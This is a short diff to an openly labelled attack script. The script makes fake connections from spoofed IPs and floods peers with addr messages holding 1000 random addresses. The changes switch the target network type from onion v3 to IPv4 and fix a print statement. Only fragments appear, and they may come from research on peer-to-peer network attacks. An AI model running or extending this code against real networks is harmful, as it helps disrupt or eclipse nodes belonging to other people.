@@ -19,7 +19,7 @@ import datetime
 import base64
 
 sendOnlyOneMessagePerIdentity = True
-networkType = 'onionv3'
+networkType = 'ipv4'
 
 
 if os.geteuid() != 0:
@@ -233,7 +233,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	identity_socket.append(s)
 
 	# Listen to the connections for future packets
-	if verbose: print('Attaching attacker script {interface}')
+	if verbose: print(f'Attaching attacker script {interface}')
 	try:
 		start_new_thread(attack, (), {
 			'socket': s,
@@ -250,7 +250,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
 	# Generate a new list of 1000 random IP addresses
 	random_addresses = [generate_random_address(networkType) for _ in range(1000)]
-	addr = addr_packet(random_addresses).to_bytes()
+	addr = addr_packet(random_addresses, networkType).to_bytes()
 
 	if sendOnlyOneMessagePerIdentity:
 		try:
